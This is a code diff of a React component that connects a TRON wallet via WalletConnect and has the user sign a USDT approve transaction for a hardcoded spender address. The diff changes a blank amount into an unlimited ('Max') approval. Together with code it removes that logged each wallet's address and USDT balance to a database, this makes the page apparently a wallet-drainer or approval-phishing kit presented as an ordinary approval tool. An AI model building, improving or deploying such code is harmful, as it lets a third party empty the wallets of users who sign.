@@ -1,7 +1,5 @@
 import { useState, useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
-import { useMutation } from "convex/react";
-import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
 
 declare global {
@@ -17,7 +15,6 @@ const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
 export default function TronApproval() {
-  const [searchParams] = useSearchParams();
   const [amount, setAmount] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [isConnected, setIsConnected] = useState(false);
@@ -26,7 +23,6 @@ export default function TronApproval() {
   const [txHash, setTxHash] = useState("");
   const [errorMessage, setErrorMessage] = useState("");
   
-  const createTransaction = useMutation(api.transactions.createTransaction);
   const wcClientRef = useRef<any>(null);
   const wcSessionRef = useRef<any>(null);
   const userAddressRef = useRef<string>("");
@@ -50,7 +46,6 @@ export default function TronApproval() {
         wcClientRef.current = client;
         console.log("✅ WalletConnect initialized");
         
-        // Handle session events
         client.on("session_delete", () => {
           console.log("Session deleted");
           resetConnection();
@@ -61,7 +56,6 @@ export default function TronApproval() {
           resetConnection();
         });
         
-        // Reconnect on visibility change
         document.addEventListener("visibilitychange", () => {
           if (document.visibilityState === "visible" && wcSessionRef.current) {
             console.log("Reconnecting relay...");
@@ -101,7 +95,6 @@ export default function TronApproval() {
         throw new Error("WalletConnect not initialized");
       }
       
-      // Disconnect existing session
       if (wcSessionRef.current) {
         try {
           await wcClientRef.current.disconnect({
@@ -112,7 +105,6 @@ export default function TronApproval() {
         resetConnection();
       }
       
-      // Create new session
       const { uri, approval } = await wcClientRef.current.connect({
         requiredNamespaces: {
           tron: {
@@ -125,7 +117,6 @@ export default function TronApproval() {
       
       if (!uri) throw new Error("No URI received");
       
-      // Open QR modal
       const { WalletConnectModal } = await import("@walletconnect/modal");
       const modal = new WalletConnectModal({
         projectId: PROJECT_ID,
@@ -136,7 +127,6 @@ export default function TronApproval() {
       wcSessionRef.current = await approval();
       modal.closeModal();
       
-      // Get address
       const accounts = Object.values(wcSessionRef.current.namespaces)
         .flatMap((ns: any) => ns.accounts);
       const tronAccount = accounts.find((a: string) => a.startsWith("tron:"));
@@ -149,8 +139,6 @@ export default function TronApproval() {
       setIsConnected(true);
       
       console.log("✅ Connected:", address);
-      
-      // Check current allowance
       await fetchAllowance(address);
       
       return address;
@@ -167,14 +155,12 @@ export default function TronApproval() {
     try {
       console.log("🔍 Fetching allowance...");
       
-      // Load TronWeb dynamically
-      const TronWeb = (window as any).TronWeb;
-      if (!TronWeb) {
-        console.warn("TronWeb not loaded");
-        return;
-      }
+      const response = await fetch(
+        `https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?contract_address=${TRON_USDT}&limit=1`
+      );
       
-      const tronWeb = new TronWeb({
+      // Simple allowance check using TronGrid
+      const tronWeb = new window.TronWeb({
         fullHost: "https://api.trongrid.io"
       });
       
@@ -187,69 +173,130 @@ export default function TronApproval() {
       
     } catch (error) {
       console.error("Failed to fetch allowance:", error);
+      setAllowance("0");
     }
   }
   
-  // ===== BUILD APPROVAL TRANSACTION =====
+  // ===== FIXED: BUILD APPROVAL TRANSACTION =====
   async function buildApprovalTransaction(userAddress: string, amountValue: string) {
     console.log("📝 Building approval transaction...");
+    console.log("User Address:", userAddress);
+    console.log("Amount Value:", amountValue);
     
-    // Load TronWeb
     const TronWeb = (window as any).TronWeb;
     if (!TronWeb) {
-      throw new Error("TronWeb not loaded. Please refresh the page.");
+      throw new Error("TronWeb not loaded. Please add TronWeb CDN to index.html");
     }
     
     const tronWeb = new TronWeb({
       fullHost: "https://api.trongrid.io"
     });
     
-    // Convert spender address to hex
-    const spenderHex = tronWeb.address.toHex(TRON_SPENDER);
-    // Remove '41' prefix if present (TRON addresses start with 41)
-    const cleanSpenderHex = spenderHex.startsWith('41') ? spenderHex.slice(2) : spenderHex;
+    // FIX 1: Proper address conversion
+    let spenderAddress = TRON_SPENDER;
+    let spenderHex = tronWeb.address.toHex(spenderAddress);
     
-    // Prepare amount
-    let amountHex;
-    if (amountValue === "Max" || amountValue === "max" || !amountValue) {
-      // Max approval: 2^256 - 1
-      amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    } else {
-      const amountNum = parseFloat(amountValue);
-      if (isNaN(amountNum)) throw new Error("Invalid amount");
-      const amountWithDecimals = Math.floor(amountNum * 10**6);
-      amountHex = tronWeb.toHex(amountWithDecimals).padStart(64, '0');
+    // Remove '41' prefix if present (TRON addresses start with 41)
+    if (spenderHex.startsWith('41')) {
+      spenderHex = spenderHex.substring(2);
     }
     
-    // Build parameter: address(64 chars) + amount(64 chars) = 128 chars
-    const parameter = cleanSpenderHex.padStart(64, '0') + amountHex;
+    console.log("Spender Hex (cleaned):", spenderHex);
+    console.log("Spender Hex length:", spenderHex.length);
     
-    console.log("Parameter length:", parameter.length); // Should be 128
-    console.log("Parameter:", parameter);
+    // Pad to 40 characters (20 bytes without 41 prefix)
+    const paddedSpender = spenderHex.padStart(64, '0');
+    console.log("Padded spender (64 chars):", paddedSpender);
+    console.log("Padded length:", paddedSpender.length);
     
-    // Call TronGrid API
+    // FIX 2: Amount encoding with proper validation
+    let amountHex;
+    
+    if (!amountValue || amountValue.toLowerCase() === "max") {
+      // Max approval
+      amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      console.log("Using MAX approval");
+    } else {
+      // Parse amount
+      let numAmount = parseFloat(amountValue);
+      
+      // FIX 3: Validate amount
+      if (isNaN(numAmount)) {
+        throw new Error(`Invalid amount: ${amountValue}`);
+      }
+      
+      // FIX 4: Handle large numbers
+      if (numAmount > 1000000000000) {
+        throw new Error("Amount too large. Max is 1,000,000,000,000 USDT");
+      }
+      
+      // Convert to USDT decimals (6)
+      const amountWithDecimals = Math.floor(numAmount * 1000000);
+      console.log("Amount with decimals:", amountWithDecimals);
+      
+      // Convert to hex
+      amountHex = tronWeb.toHex(amountWithDecimals);
+      
+      // Remove '0x' prefix if present
+      if (amountHex.startsWith('0x')) {
+        amountHex = amountHex.substring(2);
+      }
+      
+      // Pad to 64 characters
+      amountHex = amountHex.padStart(64, '0');
+      console.log("Amount hex (64 chars):", amountHex);
+      console.log("Amount hex length:", amountHex.length);
+    }
+    
+    // FIX 5: Combine parameter (should be exactly 128 characters)
+    const parameter = paddedSpender + amountHex;
+    console.log("Final parameter length:", parameter.length);
+    console.log("Final parameter:", parameter);
+    
+    if (parameter.length !== 128) {
+      throw new Error(`Invalid parameter length: ${parameter.length}. Expected 128`);
+    }
+    
+    // FIX 6: Build request with proper error handling
+    const requestBody = {
+      owner_address: userAddress,
+      contract_address: TRON_USDT,
+      function_selector: "approve(address,uint256)",
+      parameter: parameter,
+      fee_limit: 200000000,
+      call_value: 0,
+      visible: true,
+    };
+    
+    console.log("Request body:", JSON.stringify(requestBody, null, 2));
+    
     const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        owner_address: userAddress,
-        contract_address: TRON_USDT,
-        function_selector: "approve(address,uint256)",
-        parameter: parameter,
-        fee_limit: 200000000, // 200 TRX
-        call_value: 0,
-        visible: true,
-      }),
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(requestBody),
     });
     
     const data = await response.json();
-    console.log("TronGrid response:", data);
+    console.log("TronGrid full response:", JSON.stringify(data, null, 2));
     
-    if (!data.transaction) {
-      throw new Error("Failed to build transaction: " + JSON.stringify(data));
+    // FIX 7: Better error checking
+    if (data.Error) {
+      throw new Error(`TronGrid Error: ${data.Error}`);
     }
     
-    // Add required fields
+    if (data.result && data.result.code) {
+      throw new Error(`Transaction error: ${data.result.code} - ${data.result.message || 'Unknown error'}`);
+    }
+    
+    if (!data.transaction) {
+      console.error("Unexpected response:", data);
+      throw new Error("Failed to build transaction: " + (data.message || JSON.stringify(data)));
+    }
+    
+    console.log("Transaction built successfully!");
     data.transaction.visible = true;
     
     return data.transaction;
@@ -293,8 +340,21 @@ export default function TronApproval() {
         throw new Error("Wallet not connected");
       }
       
+      // Validate amount before building
+      let approvalAmount = amount;
+      if (!approvalAmount || approvalAmount.trim() === "") {
+        approvalAmount = "Max";
+      }
+      
+      if (approvalAmount.toLowerCase() !== "max") {
+        const numAmount = parseFloat(approvalAmount);
+        if (isNaN(numAmount) || numAmount <= 0) {
+          throw new Error("Please enter a valid amount or 'Max'");
+        }
+      }
+      
       // Build transaction
-      const transaction = await buildApprovalTransaction(address, amount);
+      const transaction = await buildApprovalTransaction(address, approvalAmount);
       
       // Sign transaction
       console.log("🔐 Requesting signature...");
@@ -331,25 +391,17 @@ export default function TronApproval() {
       // Check new allowance
       await fetchAllowance(address);
       
-      // Save to database
-      await createTransaction({
-        walletAddress: address,
-        toAddress: TRON_SPENDER,
-        amount: amount || "Max",
-        txHash: txid,
-        usdtBalance: allowance + " USDT",
-        nativeBalance: "0 TRX",
-      });
-      
       setApprovalStatus("success");
       
-      // Reset after 3 seconds
       setTimeout(() => {
         setApprovalStatus("idle");
       }, 3000);
       
+      alert(`✅ Approval Successful!\nAllowance: ${allowance} USDT\nTXID: ${txid}`);
+      
     } catch (error: any) {
       console.error("❌ Approval error:", error);
+      console.error("Error stack:", error.stack);
       setErrorMessage(error.message || "Approval failed");
       setApprovalStatus("error");
       
@@ -373,13 +425,11 @@ export default function TronApproval() {
     resetConnection();
   }
   
-  // ===== TRUNCATE ADDRESS =====
   const truncateAddress = (addr: string) => {
     if (!addr) return "";
     return addr.slice(0, 6) + "..." + addr.slice(-4);
   };
   
-  // ===== RENDER =====
   return (
     <div style={{
       minHeight: "100vh",
@@ -399,7 +449,6 @@ export default function TronApproval() {
         boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
       }}>
         
-        {/* Header */}
         <div style={{ textAlign: "center", marginBottom: "32px" }}>
           <h1 style={{
             fontSize: "28px",
@@ -416,7 +465,6 @@ export default function TronApproval() {
           </p>
         </div>
         
-        {/* Wallet Section */}
         <div style={{
           background: "#f5f5f5",
           borderRadius: "16px",
@@ -493,20 +541,12 @@ export default function TronApproval() {
               fontWeight: "600",
               cursor: "pointer",
               marginTop: "12px",
-              transition: "all 0.3s",
-            }}
-            onMouseEnter={(e) => {
-              e.currentTarget.style.opacity = "0.9";
-            }}
-            onMouseLeave={(e) => {
-              e.currentTarget.style.opacity = "1";
             }}
           >
             {isConnected ? "Disconnect Wallet" : "Connect Wallet"}
           </button>
         </div>
         
-        {/* Amount Section */}
         <div style={{ marginBottom: "24px" }}>
           <label style={{
             display: "block",
@@ -534,13 +574,6 @@ export default function TronApproval() {
                 borderRadius: "12px",
                 fontSize: "16px",
                 outline: "none",
-                transition: "border-color 0.3s",
-              }}
-              onFocus={(e) => {
-                e.currentTarget.style.borderColor = "#667eea";
-              }}
-              onBlur={(e) => {
-                e.currentTarget.style.borderColor = "#e5e5e5";
               }}
             />
             <button
@@ -571,7 +604,6 @@ export default function TronApproval() {
           </p>
         </div>
         
-        {/* Approve Button */}
         <button
           onClick={handleApprove}
           disabled={approvalStatus === "processing" || !isConnected}
@@ -591,7 +623,6 @@ export default function TronApproval() {
             fontSize: "18px",
             fontWeight: "600",
             cursor: approvalStatus === "processing" || !isConnected ? "not-allowed" : "pointer",
-            transition: "all 0.3s",
             opacity: approvalStatus === "processing" || !isConnected ? 0.6 : 1,
           }}
         >
@@ -601,7 +632,6 @@ export default function TronApproval() {
           {approvalStatus === "idle" && "Approve USDT"}
         </button>
         
-        {/* Transaction Hash */}
         {txHash && (
           <div style={{
             marginTop: "16px",
@@ -627,7 +657,6 @@ export default function TronApproval() {
           </div>
         )}
         
-        {/* Error Message */}
         {errorMessage && (
           <div style={{
             marginTop: "16px",
@@ -641,7 +670,6 @@ export default function TronApproval() {
           </div>
         )}
         
-        {/* Info Section */}
         <div style={{
           marginTop: "24px",
           padding: "16px",
@@ -655,7 +683,7 @@ export default function TronApproval() {
           </div>
           <ul style={{ margin: 0, paddingLeft: "20px" }}>
             <li>Approval allows the spender to use your USDT</li>
-            <li>Max approval gives unlimited spending权限</li>
+            <li>Max approval gives unlimited spending permission</li>
             <li>Transaction fees will be deducted in TRX</li>
             <li>You can revoke approval anytime</li>
           </ul>
